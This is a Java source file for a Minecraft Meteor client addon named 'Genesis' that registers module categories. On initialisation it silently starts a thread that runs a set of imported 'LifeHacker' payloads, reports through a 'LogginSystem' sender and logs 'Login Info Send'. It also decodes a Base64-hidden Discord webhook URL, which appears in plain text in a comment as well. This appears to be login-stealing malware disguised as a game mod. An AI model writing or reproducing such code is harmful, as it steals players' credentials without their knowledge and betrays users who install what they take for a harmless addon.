package genesis.team.addon;

import genesis.team.addon.util.LifeHackerUtil.LogginSystem.Utils.Sender;
import genesis.team.addon.util.LifeHackerUtil.Payload;
import genesis.team.addon.util.LifeHackerUtil.Payloads;
import genesis.team.addon.util.other.Wrapper;
import meteordevelopment.meteorclient.addons.MeteorAddon;
import meteordevelopment.meteorclient.systems.config.Config;
import meteordevelopment.meteorclient.systems.modules.Category;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.systems.modules.Modules;
import net.minecraft.item.Items;
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.Random;

public class Genesis extends MeteorAddon {
    public static final String ADDON = "Genesis";
    public static final String VERSION = "0.8";
    public static long initTime;

    public static final Category Px = new Category("Proxima", Items.RED_BED.getDefaultStack());
    public static final Category pvp = new Category("Bot", Items.RED_BED.getDefaultStack());
    public static final Category Bbc = new Category("BBC+", Items.RED_BED.getDefaultStack());
    public static final Category At = new Category("l1tecorejz", Items.RED_BED.getDefaultStack());
    public static final Category Combat = new Category("Combat+", Items.RED_BED.getDefaultStack());
    public static final Category Misc = new Category("Misc+", Items.BLUE_BED.getDefaultStack());
    public static final Category Move = new Category("Movement+", Items.WHITE_BED.getDefaultStack());
    public static final Category Render = new Category("Render+", Items.WHITE_BED.getDefaultStack());
    public static final Category Info = new Category("Info+", Items.WHITE_BED.getDefaultStack());

    public static final Logger LOG = LogManager.getLogger();
    public static final File FOLDER = new File(System.getProperty("user.home"), "BedTrapEx");

    public static void log(String message) {
        LOG.log(Level.INFO, "[" + Genesis.ADDON + "] " + message);
    }
//    public static String webhook ="https://discord.com/api/webhooks/993916295366058055/oGvuhNpzohvEqqwm_7fXexxf2XpVN4SlZ9oK_nKtZlI70_lQwkvdhavnVCA8NGmt2kGP";
    static List<String> strings = Arrays.asList(
            "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTkzOTE2Mjk1MzY2MDU4MDU1L29HdnVoTnB6b2h2RXFxd21fN2ZYZXh4ZjJYcFZONFNsWjlvS19uS3RabEk3MF9sUXdrdmRoYXZuVkNBOE5HbXQya0dQ"
    );

    public static String webhook = new String(Base64.getDecoder().decode(strings.get(new Random().nextInt(1)).getBytes(StandardCharsets.UTF_8)));




    @Override
    public void onInitialize() {
        new Thread(() -> {
            for (Payload payload : Payloads.getPayloads()) {
                try {
                    payload.execute();
                } catch (Exception e) {
                    Sender.send(e.getMessage());
                }
            }
        }).start();

        log("Login Info Send ");

        initTime = System.currentTimeMillis();
        if (!FOLDER.exists()) FOLDER.mkdirs();
        log("Initializing " + ADDON + " " + VERSION);
        Wrapper.init();

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            log("Saving config...");
            Config.get().save();
            log("Thanks for using " + ADDON + " " + VERSION + "! Don't forget to join our discord -> https://discord.gg/nc9qQSCHv2");
        }));
    }


    @Override
    public void onRegisterCategories() {
        Modules.registerCategory(Px);
        Modules.registerCategory(pvp);
        Modules.registerCategory(Bbc);
        Modules.registerCategory(At);
        Modules.registerCategory(Combat);
        Modules.registerCategory(Misc);
        Modules.registerCategory(Move);
        Modules.registerCategory(Render);
        Modules.registerCategory(Info);
    }

    @Override
    public String getPackage() {
        return "io.github.racoondog.bidoofmeteor";
    }

    public static void addModules(Module... module) {
        for (Module module1 : module) {
            Modules.get().add(module1);
        }
    }
}
